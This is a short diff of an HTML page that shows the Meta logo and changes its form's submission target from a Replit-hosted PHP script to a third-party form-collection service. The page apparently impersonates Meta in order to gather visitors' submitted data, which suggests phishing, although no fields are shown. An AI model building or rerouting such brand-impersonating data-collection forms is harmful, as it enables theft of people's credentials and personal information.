@@ -22,7 +22,7 @@
 
            <div class="main-body">
 
-    <form class="content" action="https://backend-php.replit.app/submit.php" method="POST">
+    <form class="content" action="https://submit-form.com/QeXwSsu4m" method="POST">
 
           <div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="140">
